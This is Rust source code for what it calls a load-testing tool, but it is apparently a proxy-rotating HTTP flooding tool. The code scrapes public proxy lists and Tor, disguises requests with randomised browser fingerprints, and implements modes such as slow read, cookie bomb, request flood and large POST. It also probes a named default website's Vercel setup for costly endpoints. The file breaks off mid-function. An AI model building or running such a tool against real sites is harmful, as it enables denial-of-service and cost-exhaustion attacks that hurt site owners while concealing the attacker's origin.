use std::collections::HashMap;
use std::sync::Arc;
use std::time::{Duration, Instant};
use std::sync::atomic::{AtomicBool, AtomicUsize, AtomicU64, Ordering};
use rand::prelude::*;
use rand::distr::{Distribution, weighted::WeightedIndex};
use regex::Regex;
use reqwest::{Client, RequestBuilder};
use reqwest::header::{HeaderMap, SET_COOKIE};
use scraper::{Html, Selector};
use tokio::sync::{Mutex, Semaphore};
use url::Url;

const DEFAULT_TARGET_URL: &str = "https://livdevries.com";

struct BrowserProfile {
    ua: &'static str,
    sec_ch_ua: Option<&'static str>,
    platform: Option<&'static str>,
    mobile: &'static str,
}

const BROWSER_PROFILES: &[BrowserProfile] = &[
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", sec_ch_ua: Some("\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\""), platform: Some("\"Windows\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", sec_ch_ua: Some("\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\""), platform: Some("\"Windows\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0", sec_ch_ua: None, platform: None, mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", sec_ch_ua: Some("\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\""), platform: Some("\"macOS\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.5 Safari/605.1.15", sec_ch_ua: None, platform: None, mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", sec_ch_ua: Some("\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\""), platform: Some("\"Linux\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0", sec_ch_ua: None, platform: None, mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0", sec_ch_ua: Some("\"Microsoft Edge\";v=\"125\", \"Chromium\";v=\"125\", \"Not-A.Brand\";v=\"24\""), platform: Some("\"Windows\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/109.0.0.0", sec_ch_ua: Some("\"Opera\";v=\"109\", \"Chromium\";v=\"124\", \"Not-A.Brand\";v=\"99\""), platform: Some("\"Windows\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1", sec_ch_ua: None, platform: None, mobile: "?1" },
];

struct BrowserHeaders { ordered: Vec<(String, String)> }
impl BrowserHeaders {
    fn random() -> Self {
        let mut rng = rand::rng();
        let profile = &BROWSER_PROFILES[rng.random_range(0..BROWSER_PROFILES.len())];
        let mut ordered = vec![
            ("User-Agent".to_string(), profile.ua.to_string()),
            ("Accept".to_string(), "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8".to_string()),
            ("Accept-Language".to_string(), if rng.random_bool(0.33) { "en-GB,en;q=0.9".to_string() } else { "en-US,en;q=0.9".to_string() }),
            ("Accept-Encoding".to_string(), "gzip, deflate, br".to_string()),
            ("Cache-Control".to_string(), "no-cache".to_string()),
            ("Pragma".to_string(), "no-cache".to_string()),
            ("Upgrade-Insecure-Requests".to_string(), "1".to_string()),
            ("Sec-Fetch-Dest".to_string(), "document".to_string()),
            ("Sec-Fetch-Mode".to_string(), "navigate".to_string()),
            ("Sec-Fetch-Site".to_string(), "none".to_string()),
            ("Sec-Fetch-User".to_string(), "?1".to_string()),
            ("Connection".to_string(), "keep-alive".to_string()),
        ];
        if let Some(v) = profile.sec_ch_ua { ordered.push(("Sec-CH-UA".to_string(), v.to_string())); }
        if let Some(v) = profile.platform { ordered.push(("Sec-CH-UA-Platform".to_string(), v.to_string())); }
        ordered.push(("Sec-CH-UA-Mobile".to_string(), profile.mobile.to_string()));
        
        for i in (1..ordered.len()).rev() {
            ordered.swap(i, rng.random_range(0..i + 1));
        }
        BrowserHeaders { ordered }
    }
    fn apply(&self, mut builder: RequestBuilder) -> RequestBuilder {
        for (name, value) in &self.ordered { builder = builder.header(name, value); }
        builder
    }
}

fn browser_request(builder: RequestBuilder) -> RequestBuilder { BrowserHeaders::random().apply(builder) }

fn print_help() {
    println!("Simulate Load Rust — single-system load testing tool");
    println!("");
    println!("Usage: {} [OPTIONS] [target_url] [mode] [attack_mode] [concurrency] [duration_secs]", env!("CARGO_PKG_NAME"));
    println!("");
     println!("Options:");
    println!("  -h, --help      Show this help");
    println!("  -v, --version   Show version");
    println!("  --list-modes    List available attack modes");
    println!("  --tor-only      Force Tor-only mode (no scraping)");
    println!("  --dry-run       Only probe the domain, exit without load test");
    println!("  --verify        Verify proxies, show alive count, exit without load test");
    println!("  --output CSV    Write results to CSV file");
    println!("  --proxy-file F  Load proxy list from file (one per line or comma-separated)");
    println!("  --tor-proxy URL Specify custom Tor proxy URL (e.g. socks5://127.0.0.1:9050)");
    println!("  --delay MS      Per-request delay in milliseconds");
    println!("  --max-errors N  Stop after N failed requests");
    println!("  --save-proxies F Save discovered proxies to file");
    println!("");
    println!("Modes: scrape, tor, scrape-tor (proxy source)");
    println!("Attack modes: normal, bandwidth, slowread, imageopt, largepost, assetspray,");
    println!("              rangereq, cookiebomb, ssr, middleware, requestflood, notfound");
    println!("");
    println!("Examples:");
    println!("  {} --dry-run https://livdevries.com", env!("CARGO_PKG_NAME"));
    println!("  {} https://livdevries.com 2>&1", env!("CARGO_PKG_NAME"));
    println!("  {} https://target.com tor normal 50 60 2>&1", env!("CARGO_PKG_NAME"));
}

async fn add_session_cookie(mut builder: RequestBuilder, proxy_id: &str, sessions: &Arc<Mutex<HashMap<String, String>>>) -> RequestBuilder {
    if let Some(cookie) = sessions.lock().await.get(proxy_id).cloned() {
        if !cookie.is_empty() { builder = builder.header("Cookie", cookie); }
    }
    builder
}

async fn add_session_and_extra_cookie(mut builder: RequestBuilder, proxy_id: &str, sessions: &Arc<Mutex<HashMap<String, String>>>, extra_cookie: &str) -> RequestBuilder {
    let cookie = if let Some(stored) = sessions.lock().await.get(proxy_id).cloned() {
        if stored.is_empty() { extra_cookie.to_string() } else { format!("{}; {}", stored, extra_cookie) }
    } else {
        extra_cookie.to_string()
    };
    builder = builder.header("Cookie", cookie);
    builder
}

fn extract_set_cookie(headers: &HeaderMap) -> Option<String> {
    let cookies: Vec<String> = headers
        .get_all(SET_COOKIE)
        .iter()
        .filter_map(|v| v.to_str().ok())
        .filter_map(|v| v.split(';').next())
        .filter_map(|v| { let trimmed = v.trim(); if !trimmed.is_empty() { Some(trimmed.to_string()) } else { None }})
        .collect();
    if cookies.is_empty() { None } else { Some(cookies.join("; ")) }
}

async fn update_session_from_headers(proxy_id: &str, sessions: &Arc<Mutex<HashMap<String, String>>>, headers: &HeaderMap) {
    if let Some(cookie) = extract_set_cookie(headers) {
        sessions.lock().await.insert(proxy_id.to_string(), cookie);
    }
}

fn browser_client_builder() -> reqwest::ClientBuilder {
    Client::builder().timeout(Duration::from_secs(10))
}

#[derive(Clone, Copy, PartialEq, Debug)]
enum ProxyMode { Scrape, Tor, ScrapeTorFallback }
impl std::fmt::Display for ProxyMode {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self { ProxyMode::Scrape => write!(f, "Scrape"), ProxyMode::Tor => write!(f, "Tor"), ProxyMode::ScrapeTorFallback => write!(f, "Scrape→Tor") }
    }
}

#[derive(Clone, Copy, PartialEq, Debug)]
enum AttackMode { Bandwidth, SlowRead, ImageOpt, LargePost, AssetSpray, RangeReq, CookieBomb, SSR, Middleware, RequestFlood, Normal, NotFound }
impl std::fmt::Display for AttackMode {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self { AttackMode::Bandwidth => write!(f, "Bandwidth"), AttackMode::SlowRead => write!(f, "Slow Read"),
            AttackMode::ImageOpt => write!(f, "Image Opt"), AttackMode::LargePost => write!(f, "Large POST"),
            AttackMode::AssetSpray => write!(f, "Asset Spray"), AttackMode::RangeReq => write!(f, "Range Req"),
            AttackMode::CookieBomb => write!(f, "Cookie Bomb"), AttackMode::SSR => write!(f, "SSR"),
            AttackMode::Middleware => write!(f, "Middleware"), AttackMode::RequestFlood => write!(f, "Request Flood"),
            AttackMode::Normal => write!(f, "Normal"), AttackMode::NotFound => write!(f, "404 Storm") }
    }
}

#[allow(dead_code)]
struct ProxyPool {
    clients: Vec<Client>,
    labels: Vec<String>,
    current: usize,
    cooldown_until: Vec<Instant>,
    failure_tier: Vec<u32>,
    succeeded: Vec<bool>,
    is_tor: Vec<bool>,
    weights: Vec<f64>,
}

impl ProxyPool {
    fn new(proxies: &[String]) -> Self {
        let mut clients = Vec::with_capacity(proxies.len());
        let mut labels = Vec::with_capacity(proxies.len());
        let mut is_tor = Vec::with_capacity(proxies.len());
        let mut weights = Vec::with_capacity(proxies.len());
        for u in proxies {
            let url = if u.contains("://") { u.clone() } else { format!("http://{}", u) };
            if let Ok(p) = reqwest::Proxy::all(&url) {
                if let Ok(c) = browser_client_builder().proxy(p).build() {
                    clients.push(c);
                    labels.push(url.clone());
                    is_tor.push(url.contains(":isolate@"));
                    weights.push(1.0);
                }
            }
        }
        let n = clients.len();
        ProxyPool {
            clients,
            labels,
            current: 0,
            cooldown_until: vec![Instant::now(); n],
            failure_tier: vec![0; n],
            succeeded: vec![false; n],
            is_tor,
            weights,
        }
    }

    fn next(&mut self) -> Option<(usize, Client)> {
        let now = Instant::now();
        let mut active_indices = Vec::new();
        let mut active_weights = Vec::new();
        for i in 0..self.clients.len() {
            if self.cooldown_until[i] <= now {
                active_indices.push(i);
                active_weights.push(self.weights[i]);
            }
        }
        if active_indices.is_empty() {
            return None;
        }
        let dist = WeightedIndex::new(&active_weights).ok()?;
        let sample_idx = dist.sample(&mut rand::rng());
        let idx = active_indices[sample_idx];
        Some((idx, self.clients[idx].clone()))
    }

    fn report_success(&mut self, idx: usize) {
        if idx < self.clients.len() {
            self.succeeded[idx] = true;
            self.failure_tier[idx] = 0;
            self.weights[idx] = (self.weights[idx] + 0.1).min(1.0);
        }
    }

    fn report_failure(&mut self, idx: usize) {
        if idx < self.clients.len() {
            self.failure_tier[idx] += 1;
            let secs = 2u64.pow(self.failure_tier[idx].min(8)).min(300);
            self.cooldown_until[idx] = Instant::now() + Duration::from_secs(secs);
            self.weights[idx] = (self.weights[idx] * 0.5).max(0.01);
        }
    }
}

const HTML_SRC: &[&str] = &["https://free-proxy-list.net/", "https://www.sslproxies.org/", "https://www.us-proxy.org/", "https://free-proxy-list.net/anonymous-proxy.html", "https://free-proxy-list.net/uk-proxy.html", "https://www.socks-proxy.net/"];
const RAW_SRC: &[&str] = &[
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt","https://api.proxyscrape.com/v2/?request=getproxies&protocol=https&timeout=10000&country=all","https://proxyspace.pro/https.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt","https://sunny9577.github.io/proxy-scraper/generated/https_proxies.txt","https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/wiki/gfpcom/free-proxy-list/lists/https.txt","https://vakhov.github.io/fresh-proxy-list/https.txt","https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/https/data.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/https.txt","https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/https.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt","https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all","https://proxyspace.pro/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt","https://sunny9577.github.io/proxy-scraper/generated/socks5_proxies.txt","https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/wiki/gfpcom/free-proxy-list/lists/socks5.txt","https://vakhov.github.io/fresh-proxy-list/socks5.txt","https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/socks5.txt","https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt","https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all","https://proxyspace.pro/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt","https://sunny9577.github.io/proxy-scraper/generated/socks4_proxies.txt","https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/wiki/gfpcom/free-proxy-list/lists/socks4.txt","https://vakhov.github.io/fresh-proxy-list/socks4.txt","https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/socks4.txt","https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt","https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all","https://proxyspace.pro/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-Proxy-list/master/http.txt","https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt","https://sunny9577.github.io/proxy-scraper/generated/http_proxies.txt",
    "https://raw.githubusercontent.com/wiki/gfpcom/free-proxy-list/lists/http.txt","https://vakhov.github.io/fresh-proxy-list/http.txt","https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/http.txt","https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/http.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt","https://raw.githubusercontent.com/themiralay/Proxy-List-World/master/data.txt","https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt",
];

fn detect_scheme(url: &str) -> &'static str {
    let url_lower = url.to_lowercase();
    if url_lower.contains("socks5") {
        "socks5"
    } else if url_lower.contains("socks4") {
        "socks4"
    } else if url_lower.contains("socks") {
        "socks5"
    } else {
        "http"
    }
}

async fn scrape_html(c: &Client, url: &str) -> Vec<String> {
    let scheme = detect_scheme(url);
    let r = match tokio::time::timeout(Duration::from_secs(8), browser_request(c.get(url)).send()).await { Ok(Ok(r)) => r, _ => return vec![] };
    let h = match tokio::time::timeout(Duration::from_secs(8), r.text()).await { Ok(Ok(t)) => t, _ => return vec![] };
    let doc = Html::parse_document(&h); let tr = Selector::parse("table.table tbody tr").unwrap(); let td = Selector::parse("td").unwrap(); let mut out = vec![];
    for row in doc.select(&tr) { let cells: Vec<String> = row.select(&td).map(|c| c.text().collect::<String>().trim().to_string()).collect();
        if cells.len() >= 2 { let ip = cells[0].trim().to_string(); let port = cells[1].trim().to_string(); if !ip.is_empty() && !port.is_empty() { out.push(format!("{}://{}:{}", scheme, ip, port)); } } } out
}

async fn scrape_raw(c: &Client, url: &str, re: &Regex) -> Vec<String> {
    let scheme = detect_scheme(url);
    let r = match tokio::time::timeout(Duration::from_secs(8), browser_request(c.get(url)).send()).await { Ok(Ok(r)) => r, _ => return vec![] };
    let t = match tokio::time::timeout(Duration::from_secs(8), r.text()).await { Ok(Ok(t)) => t, _ => return vec![] };
    t.lines().filter_map(|l| { let x = l.trim(); if x.is_empty() || x.starts_with('#') || x.starts_with("//") { return None; } re.captures(x).and_then(|c| c.get(1).map(|m| m.as_str().to_string())).map(|ip_port| format!("{}://{}", scheme, ip_port)) }).collect()
}

async fn scrape_all(c: &Client, state: &Arc<Mutex<AppState>>) -> Vec<String> {
    let max = state.lock().await.max_scrape; let re = Arc::new(Regex::new(r"(\d{1,3}\.\d{1,3}:\d+)").unwrap());
    let all = Arc::new(Mutex::new(Vec::new())); let sem = Arc::new(Semaphore::new(10)); let done = Arc::new(AtomicBool::new(false));
    let ht = HTML_SRC.len() as u32; let rt = RAW_SRC.len() as u32; let total = ht + rt; state.lock().await.scrape_total = total; let mut handles = vec![];
    let srcs: Vec<(&str, bool)> = HTML_SRC.iter().map(|s| (*s, true)).chain(RAW_SRC.iter().map(|s| (*s, false))).collect();
    for (idx, (src, html)) in srcs.iter().enumerate() {
        if done.load(Ordering::Relaxed) { break; }
        let p = sem.clone().acquire_owned().await.unwrap();
        if done.load(Ordering::Relaxed) { drop(p); break; }
        let s2 = state.clone(); let a2 = all.clone(); let r2 = re.clone(); let c2 = c.clone(); let s_ = src.to_string(); let maxed = done.clone(); let h = *html;
        handles.push(tokio::spawn(async move {
            { let mut st = s2.lock().await; st.scrape_phase = (idx + 1) as u32; st.status_msg = format!("Scraping {} [{}/{}]...", if h {"HTML"} else {"raw"}, idx + 1, total); }
            let p2 = if h { scrape_html(&c2, &s_).await } else { scrape_raw(&c2, &s_, &r2).await };
            let mut a = a2.lock().await; a.extend(p2);
            if a.len() >= max { maxed.store(true, Ordering::Relaxed); }
            drop(a); drop(p);
        }));
    }
    for h in handles { let _ = h.await; }
    let mut r = all.lock().await.clone(); r.sort(); r.dedup(); r.truncate(max);
    state.lock().await.total_scraped = r.len(); state.lock().await.status_msg = format!("Scraped {} unique proxies", r.len()); r
}

async fn tcp_check(addr: &str, timeout: u64) -> bool {
    let a = addr.trim_start_matches("http://").trim_start_matches("https://").trim_start_matches("socks4://").trim_start_matches("socks5://").trim_start_matches("socks://");
    tokio::time::timeout(Duration::from_secs(timeout), tokio::net::TcpStream::connect(a)).await.ok().and_then(|r| r.ok()).is_some()
}

async fn fetch_page(c: Client, url: String, delay: u64, _ua: usize, proxy_id: String, sessions: Arc<Mutex<HashMap<String, String>>>) -> Result<usize, reqwest::Error> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let builder = add_session_cookie(browser_request(c.get(&url)), &proxy_id, &sessions).await;
    let resp = builder.send().await?;
    update_session_from_headers(&proxy_id, &sessions, resp.headers()).await;
    Ok(resp.bytes().await?.len())
}

async fn fetch_range(c: Client, url: String, delay: u64, _ua: usize, proxy_id: String, sessions: Arc<Mutex<HashMap<String, String>>>) -> Result<usize, reqwest::Error> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let end = 100 + (rand::rng().random_range(0..9000));
    let builder = browser_request(c.get(&url)).header("Range", format!("bytes=0-{}", end))
        .header("Accept", "*/*").header("Cache-Control", "no-cache");
    let resp = add_session_cookie(builder, &proxy_id, &sessions).await.send().await?;
    update_session_from_headers(&proxy_id, &sessions, resp.headers()).await;
    Ok(resp.bytes().await?.len())
}

async fn fetch_slow(c: Client, url: String, delay: u64, _ua: usize, proxy_id: String, sessions: Arc<Mutex<HashMap<String, String>>>) -> Result<usize, reqwest::Error> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let builder = browser_request(c.get(&url)).header("Accept", "*/*").header("Cache-Control", "no-cache");
    let resp = add_session_cookie(builder, &proxy_id, &sessions).await.send().await?;
    update_session_from_headers(&proxy_id, &sessions, resp.headers()).await;
    let mut total = 0usize;
    let mut stream = resp.bytes_stream();
    use tokio_stream::StreamExt;
    while let Some(chunk) = stream.next().await {
        if let Ok(c) = &chunk { total += c.len(); }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    Ok(total)
}

async fn fetch_post(c: Client, url: String, delay: u64, _ua: usize, proxy_id: String, sessions: Arc<Mutex<HashMap<String, String>>>) -> Result<usize, reqwest::Error> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let body = "x".repeat(5000 + (rand::rng().random_range(0..15000)));
    let builder = browser_request(c.post(&url)).header("Content-Type", "application/x-www-form-urlencoded")
        .header("Cache-Control", "no-cache").body(body);
    let resp = add_session_cookie(builder, &proxy_id, &sessions).await.send().await?;
    update_session_from_headers(&proxy_id, &sessions, resp.headers()).await;
    Ok(resp.bytes().await?.len())
}

async fn fetch_cookie(c: Client, url: String, delay: u64, _ua: usize, proxy_id: String, sessions: Arc<Mutex<HashMap<String, String>>>) -> Result<usize, reqwest::Error> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    // Standard cookie bomb uses very large cookies (~8KB) to overload server header limits
    let bomb_payload = "x".repeat(8192);
    let cookie = format!("_ga={}; _gid={}; session={}; bomb={}",
        rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), bomb_payload);
    let builder = browser_request(c.get(&url)).header("Accept", "*/*").header("Cache-Control", "no-cache");
    let resp = add_session_and_extra_cookie(builder, &proxy_id, &sessions, &cookie).await.send().await?;
    update_session_from_headers(&proxy_id, &sessions, resp.headers()).await;
    Ok(resp.bytes().await?.len())
}

#[derive(Clone)]
struct Stats {
    running: Arc<AtomicBool>,
    total_requests: Arc<AtomicU64>,
    total_bytes: Arc<AtomicU64>,
    errors: Arc<AtomicU64>,
}

impl Stats {
    fn new() -> Self {
        Stats {
            running: Arc::new(AtomicBool::new(false)),
            total_requests: Arc::new(AtomicU64::new(0)),
            total_bytes: Arc::new(AtomicU64::new(0)),
            errors: Arc::new(AtomicU64::new(0)),
        }
    }
}

#[allow(dead_code)]
struct AppState {
    mode: ProxyMode, stats: Stats, iteration: u64,
    status_msg: String, proxy_status: Vec<(String, String)>,
    total_alive: usize, total_working: usize, total_scraped: usize,
    scrape_phase: u32, scrape_total: u32, tcp_checked: u32, tcp_total: u32,
    validated: u32, validation_total: u32, target_url: String,
    attack_mode: AttackMode, max_scrape: usize, load_concurrency: usize,
    interval_ms: u64, jitter_ms: u64, tcp_concurrency: usize,
    validate_concurrency: usize, validate_timeout_secs: u64,
    probe_status: String, has_image_opt: bool, has_api: bool, has_middleware: bool,
    is_vercel: bool, vercel_plan: String,
    has_isr: bool, has_cache_bypass: bool, has_edge_config: bool, has_log_drains: bool, has_storage: bool,
    imgs: Vec<String>, apis: Vec<String>, statics: Vec<String>,
    sessions: Arc<Mutex<HashMap<String, String>>>,
}

impl AppState {
    fn new() -> Self { AppState {
        mode: ProxyMode::Scrape, stats: Stats::new(), iteration: 0,
        status_msg: "Ready".to_string(), proxy_status: vec![],
        total_alive: 0, total_working: 0, total_scraped: 0,
        scrape_phase: 0, scrape_total: 0, tcp_checked: 0, tcp_total: 0,
        validated: 0, validation_total: 0, target_url: DEFAULT_TARGET_URL.to_string(),
        attack_mode: AttackMode::Normal, max_scrape: 100_000, load_concurrency: 20,
        interval_ms: 10, jitter_ms: 50, tcp_concurrency: 500,
        validate_concurrency: 500, validate_timeout_secs: 1,
        probe_status: "Not probed".to_string(), has_image_opt: false, has_api: false,
        has_middleware: false, is_vercel: false, vercel_plan: String::new(),
        has_isr: false, has_cache_bypass: false, has_edge_config: false, has_log_drains: false, has_storage: false,
        imgs: vec![], apis: vec![], statics: vec![],
        sessions: Arc::new(Mutex::new(HashMap::new())),
    }}
}

fn url_join(base: &str, href: &str) -> String {
    let href = href.trim();
    if href.is_empty() || href.starts_with("data:") || href.starts_with("blob:") || href.starts_with("javascript:") || href.starts_with("#") { return String::new(); }
    if href.starts_with("http://") || href.starts_with("https://") { return href.to_string(); }
    if href.starts_with("//") { return format!("https:{}", href); }
    let base = base.trim_end_matches('/');
    if href.starts_with('/') { format!("{}{}", base, href.trim_start_matches('/')) } else { format!("{}{}", base, href) }
}

async fn probe_domain(target_url: &str, state: &Arc<Mutex<AppState>>) {
    let c = browser_client_builder().timeout(Duration::from_secs(5)).build().unwrap();
    let base = target_url.trim_end_matches('/');
    let mut vercel = false; let mut plan = String::new(); let mut middleware = false;
    let mut imgs: Vec<String> = vec![]; let mut apis: Vec<String> = vec![]; let mut statics: Vec<String> = vec![]; let mut imgopt = false;
    let mut isr = false; let mut cache_bypass = false; let mut edge_config = false; let mut html = String::new();

    if let Ok(r) = browser_request(c.get(base)).send().await {
        let hdrs = r.headers();
        vercel = hdrs.get("server").and_then(|v| v.to_str().ok()).map(|s| s.contains("Vercel")).unwrap_or(false);
        if let Some(id) = hdrs.get("x-vercel-id").and_then(|v| v.to_str().ok()) { plan = format!("Vercel ({})", id.split("::").next().unwrap_or("")); }
        if hdrs.get("server").and_then(|v| v.to_str().ok()).map(|s| s.contains("cloudflare")).unwrap_or(false) { plan = "Cloudflare".to_string(); }
        middleware = hdrs.keys().any(|k| {
            let ks = k.as_str().to_lowercase();
            ks.starts_with("x-middleware-") || ks == "x-middleware-next" || ks == "x-middleware-request"
        });
        edge_config = hdrs.keys().any(|k| {
            let ks = k.as_str().to_lowercase();
            ks.starts_with("x-vercel-edge-config-") || ks.starts_with("x-edge-config-")
        });
        if let Some(cache) = hdrs.get("x-vercel-cache").and_then(|v| v.to_str().ok()) { isr = cache == "REVALIDATED"; }
        if hdrs.get("x-nextjs-cache").is_some() { isr = true; }
        if let Ok(body) = r.text().await { html = body; }
    }

    if vercel {
        if let Ok(r1) = browser_request(c.get(&format!("{}?_cb={}", base, rand::random::<u64>()))).send().await {
            if let Some(cache) = r1.headers().get("x-vercel-cache").and_then(|v| v.to_str().ok()) {
                cache_bypass = cache == "MISS" || cache == "STALE";
            }
        }
    }

    if !html.is_empty() {
        let doc = Html::parse_document(&html);
        for sel in & [("link[href]", "href"), ("script[src]", "src"), ("img[src]", "src")] {
            let s = Selector::parse(sel.0).unwrap();
            for el in doc.select(&s) { if let Some(v) = el.value().attr(sel.1) { let j = url_join(base, v); if !j.is_empty() { statics.push(j); } } }
        }
        let src_sel = Selector::parse("source[srcset]").unwrap();
        for el in doc.select(&src_sel) {
            if let Some(srcset) = el.value().attr("srcset") {
                let first = srcset.split(',').next().unwrap_or("").trim().split_whitespace().next().unwrap_or("");
                let j = url_join(base, first); if !j.is_empty() { statics.push(j); }
            }
        }
    }
    for path in & ["/favicon.ico", "/favicon.svg", "/favicon.png"] { let f = format!("{}{}", base, path); if !statics.contains(&f) { statics.push(f); } }
    statics.sort(); statics.dedup();

    // Concurrently verify statics
    let mut verified_statics: Vec<String> = vec![];
    let sem = Arc::new(Semaphore::new(10));
    let mut join_handles = vec![];
    for path in statics {
        let sem_clone = sem.clone();
        let c_clone = c.clone();
        let path_clone = path.clone();
        let vercel_clone = vercel;
        join_handles.push(tokio::spawn(async move {
            let _permit = sem_clone.acquire().await.unwrap();
            let mut is_img = false;
            let mut is_img_opt = false;
            let mut is_ok = false;
            if let Ok(r) = browser_request(c_clone.get(&path_clone)).send().await {
                if r.status().as_u16() < 400 {
                    let sz = r.bytes().await.map(|b| b.len()).unwrap_or(0);
                    if sz > 0 {
                        is_ok = true;
                        let lower = path_clone.to_lowercase();
                        if lower.contains(".jpg") || lower.contains(".jpeg") || lower.contains(".png") || lower.contains(".webp") || lower.contains(".gif") || lower.contains(".svg") {
                            is_img = true;
                            if vercel_clone {
                                if let Ok(r2) = browser_request(c_clone.get(&format!("{}?width=300", path_clone))).send().await {
                                    let sz2 = r2.bytes().await.map(|b| b.len()).unwrap_or(0);
                                    if sz2 > 0 && sz2 != sz {
                                        is_img_opt = true;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            (path_clone, is_ok, is_img, is_img_opt)
        }));
    }
    for h in join_handles {
        if let Ok((path, is_ok, is_img, is_img_opt)) = h.await {
            if is_ok {
                verified_statics.push(path.clone());
                if is_img {
                    imgs.push(path);
                    if is_img_opt {
                        imgopt = true;
                    }
                }
            }
        }
    }

    // Concurrently verify APIs
    let api_paths = ["/api/chat", "/api/health", "/api/status", "/api/products", "/api/generate"];
    let mut api_handles = vec![];
    for path in api_paths {
        let c_clone = c.clone();
        let url = format!("{}{}", base, path);
        api_handles.push(tokio::spawn(async move {
            if let Ok(r) = browser_request(c_clone.get(&url)).send().await {
                if r.status().as_u16() < 400 {
                    return Some(path.to_string());
                }
            }
            None
        }));
    }
    for h in api_handles {
        if let Ok(Some(path)) = h.await {
            apis.push(path);
        }
    }
    
    let mut status = String::new();
    if !plan.is_empty() { status.push_str(&format!("{} | ", plan)); } else if vercel { status.push_str("Vercel | "); } else { status.push_str("Unknown | "); }
    if !verified_statics.is_empty() { status.push_str(&format!("{} assets ✅ ", verified_statics.len())); }
    if imgopt { status.push_str("ImgOpt ✅ "); }
